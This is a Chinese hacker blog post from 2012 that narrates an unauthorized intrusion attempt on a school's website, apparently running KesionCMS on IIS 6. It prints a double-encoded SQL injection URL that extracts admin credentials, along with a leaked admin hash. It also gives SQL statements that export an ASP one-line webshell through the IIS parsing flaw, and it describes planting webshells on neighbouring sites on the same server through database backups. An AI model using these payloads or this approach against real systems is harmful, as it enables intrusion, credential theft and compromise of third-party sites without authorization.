<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>00后白富美学校-某黑阔渗透过程 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="post-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      

<main class="content" role="main">
  <article class="post">
    <span class="post-meta">
      <time datetime="2012-11-02T21:47:12.000Z" itemprop="datePublished">
          2012-11-03
      </time>
    
    
    | 
    <a href='/tag/白富美/'>白富美</a>
    
    
</span>
    <h1 class="post-title">00后白富美学校-某黑阔渗透过程</h1>
    <section class="post-content">
      <p>起因很简单咋QQ邮箱的订阅里收到了此消息</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/00_BFAC/clip_image002_thumb.jpg" width="574" height="147"></a></p>  <p>00后<a href="http://ha.cker.in/tag/白富美" target="_blank">白富美</a>啊<code>让咱这90后没有对象的屌丝情何以堪</code></p>  <p>打开后看到了她们学校</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image004.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/00_BFAC/clip_image004_thumb.jpg" width="349" height="482"></a></p>  <p>XX实验学校…（我们是本着学习的态度，全程打码。）</p>  <p>百度之``</p>  <p>网站是www.<strong><strong>.cn</strong></strong></p>  <p><a href="http://img.cker.in/00_BFAC/clip_image006.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/00_BFAC/clip_image006_thumb.jpg" width="426" height="98"></a></p><br><a id="more"></a><br><p></p>  <p><a href="http://img.cker.in/00_BFAC/clip_image008.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/00_BFAC/clip_image008_thumb.jpg" width="161" height="65"></a></p>  <p>IIS/6.0</p>  <p>网站生成的是静态页面…</p>  <p>后台我们看下….</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image010.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010" border="0" alt="clip_image010" src="http://img.cker.in/00_BFAC/clip_image010_thumb.jpg" width="573" height="323"></a></p>  <p>后台是某CMS改的…那这个CMS是什么哪？？？</p>  <p>这个是科讯的CMS…我们我知道呐？？？因为</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image012.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image012" border="0" alt="clip_image012" src="http://img.cker.in/00_BFAC/clip_image012_thumb.jpg" width="574" height="193"></a>在网站后台添加8就出现了本来面目```</p>  <p>我们知道了是科讯的那我们就更好的去利用</p>  <p>百度科讯漏洞</p>  <p>乌云提交的漏洞</p>  <p>哈哈RP</p>  <p>提交时间： 2012-05-22</p>  <p>公开时间： 2012-07-06</p>  <p>具体的你们去乌云网站看<a href="http://www.wooyun.org/bugs/wooyun-2010-07419" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-07419</a></p>  <p>注入语句：%’) union select 1,2,username+’|’+ password from KS_Admin   <br>转换如下：    <br>/plus/ajaxs.asp?action=GetRelativeItem&amp;key=search%2525%2527%2529%2520%2575%256e%2569%256f%256e%2520%2573%2565%256c%2565%2563%2574%2520%2531%252c%2532%252c%2575%2573%2565%2572%256e%2561%256d%2565%252b%2527%257c%2527%252b%2570%2561%2573%2573%2577%256f%2572%2564%2520%2566%2572%256f%256d%2520%254b%2553%255f%2541%2564%256d%2569%256e%2500</p>  <p>这段代码你可以得到管理帐号和密</p>  <p>这个有说明怎么转码，但是有些人估计还是不懂怎么转码的吧…. </p>  <p><a href="http://img.cker.in/00_BFAC/clip_image014.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image014" border="0" alt="clip_image014" src="http://img.cker.in/00_BFAC/clip_image014_thumb.jpg" width="573" height="61"></a></p>  <p>其实这个是二次转码</p>  <p>第一次转码</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image016.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image016" border="0" alt="clip_image016" src="http://img.cker.in/00_BFAC/clip_image016_thumb.jpg" width="239" height="116"></a></p>  <p>Union转码后%75%6E%69%6F%6E</p>  <p>第二次转码</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image018.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image018" border="0" alt="clip_image018" src="http://img.cker.in/00_BFAC/clip_image018_thumb.jpg" width="574" height="201"></a></p>  <p>二次转码我们是通过 gb2313的 URLENconde 编码</p>  <p>%75%6E%69%6F%6E转码后%2575%256E%2569%256F%256E</p>  <p>这样大家应该懂了如何来回转换的吧~</p>  <p>那麽我们现在有了帐号密码 但是我们没有认证码</p>  <p>&lt;option value=’1|2’&gt;admin|8ae2232b1cd2bd90&lt;/option&gt;</p>  <p>认证码是保存在Conn.asp这个文件里面</p>  <p>我们要知道这个文件才可以</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image020.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image020" border="0" alt="clip_image020" src="http://img.cker.in/00_BFAC/clip_image020_thumb.jpg" width="539" height="195"></a></p>  <p>也就是说拥有了帐号密码还是不可以的</p>  <p>—————————————————————————————-</p>  <p>网站关闭了注册 注册是不行了</p>  <p>有个BBS bbs禁止注册</p>  <p>有BBS后台</p>  <p><a href="http://www.xcnr.cn/bbs/dispbbs.asp?boardid=6&amp;Id=23" target="_blank" rel="external">By Dvbbs.net</a></p>  <p>动网的论坛…</p>  <p>啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊</p>  <p>管理员还做了限制那就是防下载 .mdb后缀名</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image022.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image022" border="0" alt="clip_image022" src="http://img.cker.in/00_BFAC/clip_image022_thumb.jpg" width="574" height="258"></a></p>  <p>看来管理员管理意识了得啊…</p>  <p>主站希望好渺茫啊````</p>  <p>还记得刚刚我们找到的一个地址吗</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image023.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image023" border="0" alt="clip_image023" src="http://img.cker.in/00_BFAC/clip_image023_thumb.jpg" width="574" height="193"></a></p>  <p>为什么没有想到从这个地方下手</p>  <p>笨蛋</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image025.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image025" border="0" alt="clip_image025" src="http://img.cker.in/00_BFAC/clip_image025_thumb.jpg" width="573" height="298"></a></p>  <p>全部默认 你们懂的</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image027.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image027" border="0" alt="clip_image027" src="http://img.cker.in/00_BFAC/clip_image027_thumb.jpg" width="573" height="284"></a></p>  <p>看看我们看到了什么…</p>  <p>我们进去了</p>  <p>现在就是拿shell了</p>  <p>直接上大马是没有戏的</p>  <p>因为这个服务器上的站全部智创 你们懂得智创厉害</p>  <p>8.0 拿shell是sql执行语句</p>  <p>正常情况下是</p>  <p>执行代码：   <br>1.create table cmd (a varchar(50))    <br>2.insert into cmd (a) values (‘&lt;%execute request(chr(35))%&gt;’)    <br>3.select <em> into [a] in ’D:\wwwroot\M3loee.asa;.xls’ ’excel 4.0;’ from cmd;    <br>4.drop table cmd;    <br>解释下：    <br>1.create table cmd (a varchar(50)) 建立一个有一个a字段的表 表名为cmd字段类型为字符 长度为50    <br>2.insert into cmd (a) values (‘&lt;%execute request(chr(35))%&gt;’) 在表cmd的a字段插入密码为#的一句话木马    <br>3.select </em> into [a] in ’D:\wwwroot\M3loee.asa;.xls’ ’excel 4.0;’ from cmd 把表cmd的内容导出为物理路径的一个excel文件，为什么用excel文件，因为ACCESS数据库不允许导出其他危险格式。我们导出为excel后在利用IIS解析漏洞就可以变成我们的小马了。    <br>4.drop table cmd 删表</p>  <p>但是执行到第三句…问题有了</p>  <p>这一路我们是死了</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image029.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image029" border="0" alt="clip_image029" src="http://img.cker.in/00_BFAC/clip_image029_thumb.jpg" width="574" height="194"></a></p>  <p>还有一个是更简单的</p>  <p>SELECT ‘&lt;%execute request(&quot;a&quot;)%&gt;’ into [0ldgui] in ‘D:\wwwroot\\wwwroot\8+1.asp（1.asp）’ ‘excel 8.0;’ from 0ldgui</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image031.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image031" border="0" alt="clip_image031" src="http://img.cker.in/00_BFAC/clip_image031_thumb.jpg" width="573" height="130"></a></p>  <p>怎么执行都是下面这个 数据库只读   <table border="0" cellspacing="1" cellpadding="0"><tbody>       <tr>         <td>           <p>错误号</p>         </td>          <td>           <p>来源</p>         </td>          <td>           <p>描述</p>         </td>          <td>           <p>帮助</p>         </td>          <td>           <p>帮助文档</p>         </td>       </tr>        <tr>         <td>           <p>-2147217911</p>         </td>          <td>           <p>不能更新。数据库或对象为只读。</p>         </td>          <td>           <p>Microsoft JET Database Engine</p>         </td>          <td>           <p>5003027</p>         </td>          <td>&#160;</td>       </tr>     </tbody></table> </p>  <p>看来在后台拿shell是不行了</p>  <p>即使我们拿到了目标站的认证码估计后台也拿不到shell</p>  <p>旁注也没法提权</p>  <p>主数据库完整路径为： D:\wwwroot*<strong>\wwwroot\8\KS_Data\KesionCMS8.mdb   <br>采集数据库完整路径为：D:\wwwroot*</strong>\wwwroot\KS_Data\Collect\KS_Collect.Mdb</p>  <p>90sec大牛出了个科讯漏洞应该是可以利用的</p>  <p>但是本机没有安装PHP环境</p>  <p>我们只好旁注…</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image033.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image033" border="0" alt="clip_image033" src="http://img.cker.in/00_BFAC/clip_image033_thumb.jpg" width="375" height="441"></a></p>  <p>134个站，搞下来一个就有希望了….</p>  <p>后台拿到shell 在这里说下过程</p>  <p>后台是有备份的地方 但是有一点那就是没有上传</p>  <p>没有上传的图片我怎么拿的</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image035.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image035" border="0" alt="clip_image035" src="http://img.cker.in/00_BFAC/clip_image035_thumb.jpg" width="574" height="320"></a></p>  <p>看到没 数据库竟然是asp</p>  <p>我们是在后台添加加密一句话</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image037.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image037" border="0" alt="clip_image037" src="http://img.cker.in/00_BFAC/clip_image037_thumb.jpg" width="573" height="185"></a>然后备份网站</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image039.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image039" border="0" alt="clip_image039" src="http://img.cker.in/00_BFAC/clip_image039_thumb.jpg" width="576" height="311"></a></p>  <p>这样就拿到了</p>  <p>但是网站权限很死，没有法子</p>  <p>网站安装有智创没有法子上传大马</p>  <p>上传大马提示防火墙拦截</p>  <p>旁注是死了</p>  <p>网站数据权限是只读，猜测我们及时拿到了认证码也不好拿到shell</p>  <p>还有在论坛发过一个问题帖子就是管与这个站的</p>  <p>对于这个站的限制我在问题帖子里面都说明了</p>  <p><a href="https://forum.90sec.org/thread-3878-1-4.html" target="_blank" rel="external">https://forum.90sec.org/thread-3878-1-4.html</a></p>
    </section>
    <footer class="post-footer">
      <section class="author">
    <h4>Secer</h4>
    <p>记录互联网安全历程与个人成长经历</p>
</section>
      <section class="share">
    <h4>Share this post</h4>
    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/923.seo/" target="_blank">
        <span class="hidden">weibo</span>
    </a>
    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/923.seo/"
       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <span class="hidden">Twitter</span>
    </a>
    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/923.seo/"
       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <span class="hidden">Facebook</span>
    </a>
    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/923.seo/"
       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
        <span class="hidden">Google+</span>
    </a>
</section>

    </footer>
  </article>
  <nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="/924.seo/">
        ← 记一次对Discuz官方论坛的渗透检测
    </a>
    
    <span class="icon-logo">•</span>
    
    <a class="older-posts" href="/922.seo/">
        谷歌浏览器正常跳转扩展 Google SSL Privacy Real Link Chrome Firefox →
    </a>
    
</nav>

  <div id="comment" class="comments-area">
    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
    
</div>

</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archives"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
